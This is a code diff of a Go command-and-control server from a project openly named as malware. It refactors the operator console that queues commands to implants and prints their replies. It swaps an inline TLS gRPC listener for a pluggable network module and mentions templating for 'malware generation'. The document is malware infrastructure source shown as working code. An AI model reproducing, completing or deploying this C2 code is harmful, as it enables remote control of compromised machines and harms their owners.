@@ -1,23 +1,19 @@
 package main
 
 import (
-	"context"
 	"fmt"
 	"io"
 	"io/ioutil"
 	"log"
 	"malware/common/messages"
 	"malware/common/types"
-	"net"
 	"os"
 	"strconv"
 	"strings"
-	"time"
+
+	network "malware/c2/_NETWORK_TYPE_"
 
 	"github.com/chzyer/readline"
-	"google.golang.org/grpc"
-	"google.golang.org/grpc/credentials"
-	"google.golang.org/grpc/peer"
 )
 
 type c2 struct {
@@ -30,50 +26,6 @@ const (
 	RESET = "\033[0m"
 	RED   = "\033[31m"
 )
-
-// Called when receiving a non-heartbeat message from implant
-// TODO: Should do some other stuff rather than just printing it out
-func (c2 *c2) handleReply(ip string, reply *messages.CheckCmdRequest) {
-	reply.RandomPadding = []byte{}
-
-	log.SetPrefix(RED + "[" + RESET + ip + RED + "]" + RESET + " ")
-	if err := reply.GetError(); err != 0 {
-		log.Println(RED + "Error: " + types.ErrorToString[err] + RESET)
-	} else {
-		log.Println(strings.Replace(reply.String(), "\\n", "\n", -1) + "")
-	}
-}
-
-// Get an IP from a grpc message context
-func get_ip(ctx context.Context) string {
-	if peer, ok := peer.FromContext(ctx); ok {
-		return peer.Addr.String()
-	} else {
-		return "no ip"
-	}
-}
-
-// Server listening function
-// Called automagically by grpc
-func (c2 *c2) CheckCommandQueue(ctx context.Context, req *messages.CheckCmdRequest) (*messages.CheckCmdReply, error) {
-	if req.GetHeartbeat() > 0 {
-		select {
-		case msg, ok := <-c2.queue:
-			if ok {
-				return msg, nil
-			} else {
-				panic("C2 Message Queue closed")
-			}
-		default:
-			// No message in queue
-		}
-	} else {
-		c2.handleReply(get_ip(ctx), req)
-	}
-
-	// We don't have anything to actually send back, so lets just reply with a heartbeat
-	return messages.C2_heartbeat(time.Now().Unix()), nil
-}
 
 func help() {
 	log.Println("Commands: (If module is enabled)")
@@ -190,7 +142,7 @@ func (c2 *c2) ReadUserInput() {
 		if err == readline.ErrInterrupt {
 			continue
 		} else if err == io.EOF {
-			break
+			os.Exit(0)
 		}
 
 		c2.handle_user_input(line)
@@ -246,12 +198,6 @@ func main() {
 		panic("Require Cert and Key as argument")
 	}
 
-	creds, err := credentials.NewServerTLSFromFile(os.Args[1], os.Args[2])
-
-	if err != nil {
-		panic(err)
-	}
-
 	log.SetFlags(log.Ltime)
 
 	reader, err := readline.NewEx(&readline.Config{
@@ -273,24 +219,23 @@ func main() {
 	// Will be replaced on creation from malware generation
 	c2 := &c2{queue: make(chan *messages.CheckCmdReply, 100), term: reader}
 
-	host := fmt.Sprintf(":%d", _C2_PORT_)
-	listener, err := net.Listen("tcp", host)
-
-	if err != nil {
-		panic(err)
-	}
-
-	defer listener.Close()
-
-	server := grpc.NewServer(grpc.Creds(creds))
-
-	messages.RegisterMalwareServer(server, c2)
-
 	go func() {
 		c2.ReadUserInput() // Read user input async
-		server.Stop()
+		network.KillNetwork()
 
 	}()
-	server.Serve(listener)
+
+	network.InitNetwork(_C2_PORT_, handleReply, c2.queue)
+
 	fmt.Println("Exiting due to listener shutting down")
+}
+
+func handleReply(reply *messages.CheckCmdRequest) {
+	reply.RandomPadding = []byte{}
+
+	if err := reply.GetError(); err != 0 {
+		log.Println(RED + "Error: " + types.ErrorToString[err] + RESET)
+	} else {
+		log.Println(strings.Replace(reply.String(), "\\n", "\n", -1) + "")
+	}
 }
